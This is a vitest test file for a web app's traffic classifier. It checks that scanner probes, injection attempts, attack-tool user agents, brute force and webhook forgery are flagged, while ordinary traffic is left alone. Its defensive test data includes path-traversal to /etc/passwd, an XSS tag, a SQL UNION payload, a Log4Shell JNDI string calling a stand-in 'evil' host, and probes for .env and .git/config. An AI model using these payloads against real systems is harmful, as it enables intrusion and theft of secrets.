// ============================================================================
// Traffic classification rules.
//
// WHAT THIS FILE PROVES, AND WHY EACH CASE IS HERE
//
// The verdict is the only thing standing between "an operator reads a log" and
// "an operator trusts a log". Two failure modes matter more than any single
// rule:
//
//   * A FALSE HOSTILE on ordinary traffic. A customer with an expired session
//     flagged as an attacker teaches the operator to ignore the column.
//   * A MISSED HOSTILE on a real attack. A brute force that lands on
//     "suspicious" is a brute force nobody acts on.
//
// Every rule therefore gets both a positive case and the near-miss that must
// NOT trigger it.
// ============================================================================
import { describe, it, expect } from "vitest";
import {
  classify,
  classifyUserAgent,
  scanPathHit,
  injectionHit,
  severityForStatus,
  isIncident,
  VERDICT,
  KIND,
  SEVERITY,
  THRESHOLDS,
} from "@/lib/traffic/classify.js";

const UA_SAFARI =
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.6 Safari/605.1.15";

describe("ordinary traffic is NORMAL", () => {
  it("a page view from a real browser", () => {
    const result = classify({ kind: KIND.PAGE_VIEW, path: "/topup/mobile-legends", status: 200, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.NORMAL);
    expect(result.rule).toBeNull();
    expect(result.severity).toBe(SEVERITY.INFO);
  });

  it("an expired session (401) is NOT an attack", () => {
    // The single most important false-positive guard: this is the most common
    // 4xx in any app with sessions.
    const result = classify({ kind: KIND.API_CALL, path: "/api/orders", status: 401, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.NORMAL);
  });

  it("a validation error (422) is the caller's typo, not an incident", () => {
    const result = classify({ kind: KIND.API_CALL, path: "/api/auth/register", status: 422, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.NORMAL);
  });

  it("a 500 is an incident but still not a security verdict", () => {
    const result = classify({ kind: KIND.FATAL, path: "/api/orders", status: 500, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.NORMAL);
    expect(result.severity).toBe(SEVERITY.ERROR);
  });
});

describe("scanner probes", () => {
  it.each([
    "/wp-admin.php",
    "/wp-login.php",
    "/wp-content/plugins/x.php",
    "/xmlrpc.php",
    "/.env",
    "/.git/config",
    "/phpmyadmin/index.php",
    "/server-status",
    "/actuator/health",
    "/backup.zip",
    "/db.sql",
  ])("%s is a scan probe", (path) => {
    expect(scanPathHit(path)).not.toBeNull();
    const result = classify({ kind: KIND.SCAN, path, status: 404, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.SUSPICIOUS);
    expect(result.rule).toBe("SCAN_PROBE");
    expect(result.kind).toBe(KIND.SCAN);
  });

  it.each(["/", "/topup", "/api/orders", "/member/orders", "/environment", "/.envrc-not-really"])(
    "%s is NOT a scan probe",
    (path) => {
      // "/environment" and "/.envrc-not-really" are the near-misses that a
      // sloppy `startsWith("/.env")` would wrongly flag.
      expect(scanPathHit(path)).toBeNull();
    }
  );
});

describe("injection attempts are HOSTILE", () => {
  it.each([
    ["/../../etc/passwd", "path traversal"],
    ["/topup/../../../etc/passwd", "path traversal"],
    ["/<script>alert(1)</script>", "skrip di URL"],
    ["/search?q=1 UNION SELECT password", "pola SQL injection"],
    ["/${jndi:ldap://evil}", "pola Log4Shell"],
  ])("%s -> %s", (path, label) => {
    expect(injectionHit(path)).toBe(label);
    const result = classify({ kind: KIND.API_CALL, path, status: 400, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.HOSTILE);
    expect(result.rule).toBe("INJECTION_ATTEMPT");
  });

  it("a normal query string is not an injection", () => {
    expect(injectionHit("/topup/pulsa/telkomsel?nomor=08123456789")).toBeNull();
  });
});

describe("attack tooling", () => {
  it("sqlmap / nikto / wpscan user agents are HOSTILE", () => {
    for (const ua of ["sqlmap/1.7", "Nikto/2.1.6", "WPScan v3.8", "masscan/1.3", "zgrab/0.x"]) {
      const parsed = classifyUserAgent(ua);
      expect(parsed.hostile, ua).toBe(true);
      const result = classify({ kind: KIND.API_CALL, path: "/", status: 200, userAgent: ua });
      expect(result.verdict).toBe(VERDICT.HOSTILE);
      expect(result.rule).toBe("HOSTILE_USER_AGENT");
    }
  });

  it("a crawler is not an attack tool", () => {
    const parsed = classifyUserAgent("Mozilla/5.0 (compatible; Googlebot/2.1)");
    expect(parsed.hostile).toBe(false);
    expect(parsed.crawler).toBe(true);
    // A crawler fetching a page is exactly what a crawler should do.
    expect(classify({ kind: KIND.PAGE_VIEW, path: "/promo", status: 200, userAgent: "Googlebot/2.1" }).verdict).toBe(
      VERDICT.NORMAL
    );
  });

  it("a crawler calling an API is suspicious, but a crawler failing a login keeps its own kind", () => {
    const onApi = classify({ kind: KIND.API_CALL, path: "/api/orders", status: 200, userAgent: "Googlebot/2.1" });
    expect(onApi.verdict).toBe(VERDICT.SUSPICIOUS);
    expect(onApi.rule).toBe("CRAWLER_ON_API");

    // "a bot tried to log in" must stay AUTH_FAILURE: an operator filtering by
    // kind needs to find it under authentication, not under bot.
    const onLogin = classify({
      kind: KIND.AUTH_FAILURE,
      path: "/api/auth/login",
      status: 401,
      code: "ITP_INVALID_CREDENTIALS",
      userAgent: "python-requests/2.31",
    });
    expect(onLogin.kind).toBe(KIND.AUTH_FAILURE);
  });
});

describe("brute force thresholds", () => {
  it("a couple of failed logins is normal or merely suspicious", () => {
    expect(classify({ kind: KIND.AUTH_FAILURE, path: "/api/auth/login", status: 401, userAgent: UA_SAFARI, recentAuthFailures: 1 }).verdict).toBe(
      VERDICT.NORMAL
    );
    expect(classify({ kind: KIND.AUTH_FAILURE, path: "/api/auth/login", status: 401, userAgent: UA_SAFARI, recentAuthFailures: 3 }).verdict).toBe(
      VERDICT.SUSPICIOUS
    );
  });

  it("crossing the hostile threshold escalates", () => {
    const result = classify({
      kind: KIND.AUTH_FAILURE,
      path: "/api/auth/login",
      status: 401,
      userAgent: UA_SAFARI,
      recentAuthFailures: THRESHOLDS.authFailHostile,
    });
    expect(result.verdict).toBe(VERDICT.HOSTILE);
    expect(result.rule).toBe("AUTH_BRUTE_FORCE");
    expect(result.severity).toBe(SEVERITY.ERROR);
  });

  it("a request flood is hostile", () => {
    const result = classify({
      kind: KIND.API_CALL,
      path: "/api/topup/price",
      status: 200,
      userAgent: UA_SAFARI,
      recentRequests: THRESHOLDS.requestBurst,
    });
    expect(result.verdict).toBe(VERDICT.HOSTILE);
    expect(result.rule).toBe("REQUEST_FLOOD");
  });

  it("404 enumeration is suspicious", () => {
    const result = classify({
      kind: KIND.PAGE_VIEW,
      path: "/produk/tidak-ada",
      status: 404,
      userAgent: UA_SAFARI,
      recentNotFound: THRESHOLDS.notFoundBurst,
    });
    expect(result.verdict).toBe(VERDICT.SUSPICIOUS);
    expect(result.rule).toBe("NOT_FOUND_ENUMERATION");
  });
});

describe("webhook forgery", () => {
  it("a bad signature is HOSTILE, not a validation error", () => {
    const result = classify({
      kind: KIND.WEBHOOK,
      path: "/api/webhooks/payment",
      status: 401,
      code: "ITP_WEBHOOK_INVALID_SIGNATURE",
      userAgent: "Midtrans/1.0",
    });
    expect(result.verdict).toBe(VERDICT.HOSTILE);
    expect(result.rule).toBe("WEBHOOK_FORGERY");
  });
});

describe("staff surface probing", () => {
  it("an unauthenticated call to a staff API is suspicious", () => {
    const result = classify({ kind: KIND.API_CALL, path: "/api/dev/members", status: 401, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.SUSPICIOUS);
    expect(result.rule).toBe("STAFF_API_UNAUTHENTICATED");
  });

  it("the member API doing the same is not", () => {
    // Only /api/dev is the privileged surface; /api/member 401s constantly for
    // signed-out visitors and flagging those would be pure noise.
    const result = classify({ kind: KIND.API_CALL, path: "/api/member/profile", status: 401, userAgent: UA_SAFARI });
    expect(result.verdict).toBe(VERDICT.NORMAL);
  });
});

describe("missing user agent", () => {
  it("is suspicious but never hostile", () => {
    const result = classify({ kind: KIND.PAGE_VIEW, path: "/", status: 200, userAgent: null });
    expect(result.verdict).toBe(VERDICT.SUSPICIOUS);
    expect(result.rule).toBe("NO_USER_AGENT");
    expect(result.severity).toBe(SEVERITY.INFO);
  });
});

describe("helpers", () => {
  it("severityForStatus follows the ladder", () => {
    expect(severityForStatus(200)).toBe(SEVERITY.INFO);
    expect(severityForStatus(404)).toBe(SEVERITY.INFO);
    expect(severityForStatus(429)).toBe(SEVERITY.WARN);
    expect(severityForStatus(500)).toBe(SEVERITY.ERROR);
    expect(severityForStatus(null)).toBe(SEVERITY.INFO);
  });

  it("isIncident is true for hostile or error-and-above only", () => {
    expect(isIncident({ verdict: VERDICT.HOSTILE, severity: SEVERITY.INFO })).toBe(true);
    expect(isIncident({ verdict: VERDICT.NORMAL, severity: SEVERITY.ERROR })).toBe(true);
    expect(isIncident({ verdict: VERDICT.SUSPICIOUS, severity: SEVERITY.WARN })).toBe(false);
    expect(isIncident({ verdict: VERDICT.NORMAL, severity: SEVERITY.INFO })).toBe(false);
  });
});
